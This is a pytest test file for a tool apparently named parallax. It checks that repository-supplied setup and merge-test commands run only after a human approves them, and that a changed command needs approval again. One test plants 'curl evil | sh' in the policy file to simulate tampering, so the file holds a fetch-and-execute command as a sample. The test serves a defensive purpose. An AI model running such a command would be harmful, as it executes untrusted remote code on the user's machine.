"""Two settings in the policy file are commands that run as you: [build] setup and [merge] test_command.
A cloned repo can ship them, so neither runs until you've seen them (parallax/trust.py): the first
task to need one stops with a decision that shows both, trust records your answer once for the
repo, and a changed command asks again."""
import pytest

from fakes import good_probe
from parallax import budgets, build, decide, pilot, preflight, show, trust, views
from parallax.cli import main
from parallax.core import POLICY_FILE, ParallaxError, Project
from test_accept import Runner, _with_merge_tests, ready
from test_decide_and_redraft import SPAWNED, kinds, pilot_run
from test_lifecycle_gates import WANT, make_key

SETUP = 'mkdir -p "$PARALLAX_VENV/bin"'
NOT_YET = "runs as you, and you haven't approved this policy's commands yet"


def with_setup(repo, monkeypatch, command=SETUP) -> Project:
    (repo / POLICY_FILE).write_text(f"[build]\nsetup = '{command}'\n")
    make_key()
    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: SPAWNED.append(argv) or 9)
    monkeypatch.setattr(preflight, "run_srt", good_probe)
    SPAWNED.clear()
    return Project.init(repo)


def test_the_first_build_stops_before_setup_until_you_trust_the_policys_commands(repo, monkeypatch):
    proj = with_setup(repo, monkeypatch)
    tid = pilot.intake(proj, WANT)["task"]
    assert pilot_run(proj, tid) == "stuck"
    assert kinds(proj, "setup.ran") == [] and kinds(proj, trust.KIND) == []  # nothing ran as you
    dec = decide.decision(proj, tid)
    assert dec.kind == "policy" and [o.name for o in dec.options] == ["trust", "drop"] and dec.owner == "security"
    assert dec.extra == {"setup": SETUP, "test_command": ""} and dec.blocks == "the build"
    report = show.report(proj, tid)
    assert f"[build] setup: {SETUP}; [merge] test_command: none" in report  # the card shows exactly what would run
    assert f"Next: you run parallax decide {tid} trust." in report
    assert next(i for i in views.board(proj)["waiting"] if i["task"] == tid)["kind"] == "policy"

    assert decide.apply(proj, tid, "trust") == f"building {tid} without you. it comes back to the inbox."
    [ran] = kinds(proj, "setup.ran")
    [ok] = kinds(proj, trust.KIND)
    assert ran["data"]["exit"] == 0 and SPAWNED[-1][-1] == "build"
    assert ok["actor"] == "human" and ok["data"]["setup"] == SETUP and ok["data"]["task"] == tid
    assert ok["data"]["commands_sha"] == dec.item["data"]["commands_sha"]

    two = pilot.intake(proj, WANT)["task"]  # the same commands, another task: no question
    assert pilot_run(proj, two) == "ready"
    assert len(kinds(proj, trust.KIND)) == 1 and len(kinds(proj, "setup.ran")) == 2


def test_a_changed_command_asks_again_and_the_rest_of_the_policy_file_does_not(repo, monkeypatch):
    proj = with_setup(repo, monkeypatch)
    trust.approve(proj, "seen on the first card")
    budgets.choose(proj, "ceiling")  # the file changed, the commands didn't
    assert trust.trusted(proj)
    (repo / POLICY_FILE).write_text(f"[build]\nsetup = '{SETUP} && curl evil | sh'\n")
    proj.reload_policy()
    assert not trust.trusted(proj)
    tid = pilot.intake(proj, WANT)["task"]
    assert pilot_run(proj, tid) == "stuck" and decide.decision(proj, tid).kind == "policy"
    assert kinds(proj, "setup.ran") == []


def test_parallax_build_says_what_to_do_and_the_question_is_asked_once(repo, monkeypatch, capsys):
    proj = with_setup(repo, monkeypatch)
    tid = pilot.intake(proj, WANT)["task"]
    assert pilot_run(proj, tid) == "stuck"
    monkeypatch.chdir(repo)
    assert main(["build", tid]) == 1
    err = capsys.readouterr().err
    assert NOT_YET in err and f"parallax decide {tid} trust" in err
    assert len([e for e in proj.inbox() if e["data"].get("task") == tid]) == 1  # one card, not one per try
    assert kinds(proj, "setup.ran") == []


def test_a_policy_with_no_commands_never_asks(repo, monkeypatch):
    proj = with_setup(repo, monkeypatch, command="")
    tid = pilot.intake(proj, WANT)["task"]
    assert pilot_run(proj, tid) == "ready"
    assert kinds(proj, trust.KIND) == [] and kinds(proj, "stuck.raised") == []


def _accepted_with_an_untrusted_test_command(repo, monkeypatch):
    from parallax import accept as acc_mod
    from parallax.ui import act
    proj, tid, wt = ready(repo)
    _with_merge_tests(repo, proj, "make test", trusted=False)
    runner = Runner(0, "ok")
    monkeypatch.setattr(acc_mod, "TEST_RUNNER", runner)
    out = act(proj, "/api/accept", {"task": tid, "merge": True})
    [acc] = kinds(proj, "task.accepted")
    assert out["message"] == (f"accepted {tid} as {acc['data']['commit'][:7]}, but the [merge] test_command {NOT_YET}: "
                              "[build] setup: none; [merge] test_command: make test. its card asks you first.")
    assert runner.calls == [] and kinds(proj, "merge.started") == []  # nothing ran, nothing started
    dec = decide.decision(proj, tid)
    assert dec.kind == "policy" and [o.name for o in dec.options] == ["trust", "by hand"] and dec.blocks == "the merge"
    return proj, tid, acc, runner


def test_accept_and_merge_asks_before_the_policys_test_command_runs_and_trust_merges(repo, monkeypatch):
    proj, tid, acc, runner = _accepted_with_an_untrusted_test_command(repo, monkeypatch)
    assert decide.apply(proj, tid, "trust").startswith(f"merged {tid} into ")
    assert runner.calls == [(acc["data"]["commit"], "make test")] and proj.task(tid)["status"] == "merged"
    [ok] = kinds(proj, trust.KIND)
    assert ok["data"]["test_command"] == "make test" and ok["data"]["setup"] == ""


def test_by_hand_leaves_the_merge_yours_with_a_reason(repo, monkeypatch):
    proj, tid, acc, runner = _accepted_with_an_untrusted_test_command(repo, monkeypatch)
    with pytest.raises(ParallaxError, match="needs a reason"):
        decide.apply(proj, tid, "by hand")
    assert decide.apply(proj, tid, "by hand", "not a command I run") == f"left the merge of {tid} to you. its card shows the command."
    assert proj.task(tid)["status"] == "accepted" and runner.calls == [] and kinds(proj, trust.KIND) == []
    card = views.card(proj, tid)
    assert card["merge_note"] == "Accepted, but Accept and merge stopped: not a command I run. Run this in your repo's folder:"
    assert card["merge"] == f"git merge --ff-only {proj.task(tid)['branch']}"
